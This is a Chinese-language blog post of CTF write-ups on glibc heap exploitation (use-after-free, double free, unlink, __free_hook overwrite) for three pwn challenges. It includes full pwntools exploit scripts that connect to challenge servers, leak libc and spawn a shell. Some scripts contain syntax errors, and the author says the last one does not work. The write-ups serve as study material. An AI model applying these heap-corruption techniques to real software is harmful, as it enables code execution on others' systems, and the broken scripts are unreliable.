---
title: "double free 与 unlink 利用"
date: 2025-07-05
categories:
  - 二进制安全
  - 堆利用
tags:
  - pwn
  - heap
  - double-free
  - unlink
---

# [WUSTCTF 2020]easyfast
main函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009249-ba7439b6-7ac9-46cf-be01-f36748023946.png)

菜单


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009430-a6ecb8d6-8eae-48ba-88ef-01f7c785b17e.png)

add，我们只能申请四个堆块。要小于0x78


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009208-a4c1c2dd-67c4-48d5-8095-43a4a0c6343b.png)

Delete。这里free没有检查，有uaf


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009304-65b846da-97ef-4871-ab26-9637835d1395.png)

Edit，read只能读8个，一个地址的长度


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009329-dcc78ab2-b788-46fd-a74e-43f687f4686e.png)

Backdoor。后门的条件是这个地址数等于0


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010098-34bb718c-2f61-4fb8-b553-08dd94768eb6.png)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010172-ced52f51-7c99-41e5-9a14-06885a30ccac.png)

我们要把指针改到602090这个位置去把它的数改成0.再去执行后门

可以uaf。因为这块限制到了只能四次。先只用uaf

先定义然后最后调用就行。这道题有后门。

```plain
from pwn import*
io=remote('node5.anna.nssctf.cn',22674)
#p=process('./service')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./service')

addr=0x602090-0x10

def add(size):
    io.sendlineafter(b"choice>\n",b"1")
    io.sendlineafter(b"size>\n",str(size))
    
def free(idx):
    io.sendlineafter(b"choice>\n",b"2")
    io.sendlineafter(b"index>\n",str(idx))
    
def edit(idx,context):
    io.sendlineafter(b"choice>\n",b"3")
    io.sendlineafter(b"index>\n",str(idx))
    io.sendline(context)
    
def backdoor():
    io.sendlineafter(b"choice>\n",b"4")
    
if __name__=="__main__"
    add(0x40）
    free(0)
    edit(0,p64(addr))
    add(0x40）
    add(0x40)
    edit(2,p64(0))
    backdoor()
    io.interactive()
```

首先用一个堆块构造uaf,然后编辑它到目标地址。再申请chunk1，让它从free list里拿到chunk0。指针到了目标地址。在申请chunk2，指针返回给用户（chunk2 = (void*)addr）

然后我们再edit编辑chunk2，全改成0.因为read这只让读0x8，然后我们就写八字节的0覆盖掉就行

最后执行后门判断，然后就会执行bin/sh


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010366-da40f683-fadc-4603-bd69-4e23ff9ae71a.png)

## 有一点套路
Double free

```plain
add(0x20) # chunk0
add(0x20) # chunk1
free(0) # free chunk0
free(1) # free chunk1
free(0) # free chunk0
```

如上执行可以构造循环链表0→1→0, 再执行

```plain
add(0x20) # 分配出 chunk0
add(0x20) # 分配出 chunk1
edit(2, target_addr) # edit chunk0 fd指针
add(0x20) # 分配出 chunk0
add(0x20) # 申请到 target_addr 处的 chunk
```

就能劫持chunk到target_addr, 如果提供了edit功能, 就能得到任意地址写的能力

它申请的时候会多0x10.好像是有个原理。地址计算的时候不能从90开始。要减去0x10，也是这个原理

# [SUCTF 2018 招新赛]unlink
菜单


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010239-9d7e2d00-3252-4e27-862c-eff8171c72f2.png)

add函数，没有什么特别的地方


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010519-df114561-a8d7-48e3-ba34-db167c2da658.png)

Free free的时候对buf进行了检查。没有uaf。if这有个数组越界？（看着是）


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010819-8a1707ff-8866-4e3d-b9ab-ad21cdb1e252.png)

show函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010918-481ac6f7-d67e-4045-8ea6-a1eba66484c5.png)

Edit 编辑函数，它读入了0x100可能要堆溢出


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010956-ebd8ca13-bc00-4925-9051-a89ea44b358d.png)

题目说unlink，就堆溢出unlink来做。没有后门就要unlink来泄露libc

unlink的常见手法就是构造三个堆块来做假的，然后改双链表的指针。这道题堆在bss段上


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011315-d9632c4e-c0a7-4d43-9ce7-b2948140eb2e.png)

我们要改0x6020c0这的指针。先申请三个chunk。最后一个是用来防止与top chunk合并的

要利用bin的话就是满足fast bin和small bin或者unsort bin的大小来申请。

fast一般要小于0x80 small bin是小于0x200（0x400）32和64好像不一样

接下来交换指针，fd,bk减去用对应的假堆的偏移。后续交换指针

再改到要指的位置，用show打印出puts函数got表的地址。泄露libc

覆盖返回地址的时候用了一个free hook 。[参考一下这个](https://hnusec-star.feishu.cn/wiki/ZLF2wqKQUi2OwNkUnWVc3bILnzc)

```plain
from pwn import *
from LibcSearcher import *
#context(arch='amd64',log_level='debug')
 
# io=process('./service2')
io=remote('node4.anna.nssctf.cn',28326)
elf=ELF('./service2')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size):
    io.sendlineafter(b'chooice :\n',b'1')
    io.sendlineafter(b'size : \n',str(size).encode())
 
def free(index):
    io.sendlineafter(b'chooice :\n',b'2')
    io.sendlineafter(b'to delete\n',str(index).encode())
 
def show(index):
    io.sendlineafter(b'chooice :\n',b'3')
    io.sendlineafter(b'to show\n',str(index).encode())
    io.recvuntil(b'is : ')
 
def edit(index,payload):
    io.sendlineafter(b'chooice :\n',b'4')
    io.sendlineafter(b'modify :\n',str(index).encode())
    io.sendafter(b'content\n',payload)
 

buf=0x6020C0
add(0x20) 
add(0x80)  
add(0x100) 

prev_size=p64(0)
chunk_size=p64(0x20)
fd=buf-0x18
bk=buf-0x10
content=p64(fd)+p64(bk)
fake_prev_size=p64(0x20)
fake_chunk_size=p64(0x90)

payload=prev_size+chunk_size+content+fake_prev_size+fake_chunk_size
edit(0,payload)
free(1)

payload=p64(0)*3+p64(0x6020c8)
edit(0,payload)

payload=p64(elf.got['puts'])
edit(0,payload)

show(1)
puts=u64(io.recvuntil(b'\x7f')[-6:]+b'\x00\x00')
print(hex(puts))

libc_base=puts-libc.sym['puts']
free_hook=libc_base+libc.sym['__free_hook']
bin_sh=libc_base+next(libc.search(b'/bin/sh\x00'))
payload=p64(free_hook)+p64(bin_sh)
edit(0,payload)

system=libc_base+libc.sym['system']
edit(1,p64(system))

free(2)
 
io.interactive()
```

有字节转换的问题。网上查到了在str后面加.encode这个

```plain
str().encode()
```

# [HNCTF 2022 WEEK4]ezheap
这道题没有uaf，题目给了libc。看一下函数

Menu 这个是用来和用户交互的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011128-d091b74c-3143-4913-9590-b419f464ff97.png)

Main 判断比较复杂


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011409-6ddd5dd0-f315-4091-af60-59240f027b9e.png)

Edit 这看上去没啥问题。这个nbytes说的是可以溢出。溢出了不知道有啥用。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011502-597f4446-6189-4f19-8e5a-06901699e7c1.png)

Delete 对free后的指针做了判断


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011644-7bb0eef8-e6d5-4c7b-95f4-b1def31e1e80.png)

Show v1满足条件会返回一个地址


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011756-484fbaf2-48c2-4549-8548-34b00252555b.png)

Add add这里说这个是puts


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531012077-9e60a91f-82f4-446c-8842-a2ae8e645f67.png)

是用show和add里的put来劫持地址。没打通

```plain
from pwn import*

io=remote('node5.anna.nssctf.cn',23101)
#io=process('./ezheap')
elf = ELF('./ezheap')
libc = ELF('./libc-2.23.so')

def debug():
    gdb.attach(io)
    pause()

def choice(idx):
    io.sendlineafter("Choice: ",str(idx).encode())

def add(idx,size,name,content):
    choice(1)
    io.sendlineafter("Input your idx:",str(idx).encode())
    io.sendlineafter("Size:",str(size).encode())
    io.sendlineafter("Name: ",str(name).encode())
    io.sendlineafter("Content:",str(context).encode())

def delete(idx):
    choice(2)
    io.sendlineafter("Input your idx:",str(idx).encode)
    
def show(idx):
    choice(3)
    io.sendlineafter("Input your idx:",str(idx).encode())
    
def edit(idx,size,contect):
    choice(4)
    io.sendlineafter("Input your idx:",str(idx).encode())
    io.sendlineafter("Size:",str(size).encode())
    io.sendline(contect)

add(0,0x10,b'good',b'aaaa')
add(1,0x10,b'good',b'aaaa')


payload=p64(0)*3+p64(0x31)+p64(0)*2+p8(0x80)
edit(0,0x31,payload)
show(1)
#debug()

puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b"\x00"))
libc_base = puts_addr - libc.sym['puts']
system = libc_base + libc.sym['system']

payload = p64(0)*3+p64(0x31)+b"bin/sh\x00"+p64(0)*2+p64(1)+p64(system)
edit(0,0x48,payload)
show(1)
io.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531012322-4d96f22a-dada-4ac0-a593-764bc8eec6d2.png)